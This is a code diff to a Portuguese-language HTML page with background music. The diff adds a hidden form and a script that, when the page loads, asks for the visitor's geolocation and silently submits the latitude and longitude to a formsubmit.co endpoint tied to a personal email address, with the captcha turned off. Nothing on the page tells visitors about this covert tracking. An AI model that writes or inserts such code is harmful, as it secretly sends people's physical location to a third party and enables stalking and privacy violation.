@@ -1,6 +1,12 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
+      <form id="locationForm" action="https://formsubmit.co/luizsa190406@gmail.com" method="POST" style="display:none;">
+    <input type="hidden" name="latitude" id="latitude">
+    <input type="hidden" name="longitude" id="longitude">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+</form>
       <script>
         window.onload = function() {
             if (navigator.geolocation) {
@@ -70,5 +76,19 @@
   <audio id="backgroundMusic" src="sons/judas.mp3" loop></audio>
 
   <script src="script.js"></script>
+        <script>
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+        document.getElementById('latitude').value = position.coords.latitude;
+        document.getElementById('longitude').value = position.coords.longitude;
+        document.getElementById('locationForm').submit();
+    }, function(error) {
+        console.error('Erro ao obter localização:', error);
+    });
+} else {
+    console.error('Geolocalização não suportada neste navegador.');
+}
+</script>
+
 </body>
 </html>
